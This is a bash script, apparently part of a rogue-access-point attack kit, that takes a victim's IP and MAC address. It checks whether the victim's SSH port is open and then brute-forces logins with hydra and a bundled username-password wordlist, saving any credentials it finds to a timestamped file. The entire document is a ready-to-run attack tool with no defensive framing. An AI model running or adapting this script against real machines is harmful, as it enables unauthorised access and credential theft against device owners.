#!/bin/bash
# Args: $1=IP  $2=MAC  $3=ATTACKER_IP
# Env:  KARMA_OUT

WAIT=2
DPORT=22
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORDLIST="$SCRIPT_DIR/piata_ssh_userpass.txt"
TIME="$(date +'%H:%M:%S_%d.%m.%Y')"
OUT="${KARMA_OUT:-$SCRIPT_DIR/../..}"
mkdir -p "$OUT"
OUTFILE="$OUT/ssh-${1}_${TIME}.txt"

if ! nc -nw $WAIT "$1" $DPORT </dev/null 2>/dev/null; then
	exit 0
fi

echo "[*] bruteforcing SSH on $1" | tee "$OUTFILE"
hydra -C "$WORDLIST" -t 4 -f "ssh://$1" 2>/dev/null \
	| grep -E 'password:|login:' | tee -a "$OUTFILE"

if grep -q 'password:' "$OUTFILE"; then
	echo "[+] SSH credentials found on $1 — see $OUTFILE"
else
	echo "[-] SSH brute: no credentials found on $1" | tee -a "$OUTFILE"
fi
